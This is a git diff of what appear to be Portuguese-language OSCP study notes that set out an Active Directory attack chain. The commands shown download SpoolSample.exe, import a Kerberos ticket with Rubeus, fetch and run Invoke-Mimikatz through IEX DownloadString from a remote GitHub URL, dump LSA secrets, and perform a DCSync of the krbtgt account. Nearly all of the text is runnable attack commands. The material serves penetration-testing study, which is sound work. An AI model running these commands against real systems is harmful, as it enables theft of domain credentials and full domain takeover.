@@ -1356,16 +1356,20 @@ curl https://github.com/n0ts0cial/oscp/raw/main/SpoolSample.exe -Outfile SpoolSa
 ```
 IMPORTAR O TICKET DO DC:
 ```
-\Rubeus.exe ptt /ticket:doIFqjCCBaagguTE9DQUw=
+.\Rubeus.exe ptt /ticket:doIFqjCCBaagguTE9DQUw=
 ```
 CARREGAR O MIMIKATZ E FAZER O DCSYNC:
 ```
 IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1")
 Invoke-Mimikatz
 ```
+ACHO Q NÃO PRECISA DISSO
 ```
 privilege::debug
 lsadump::lsa /patch
+```
+FAZER O DCSYNC
+```
 lsadump::dcsync /user:tech\krbtgt
 ```
 
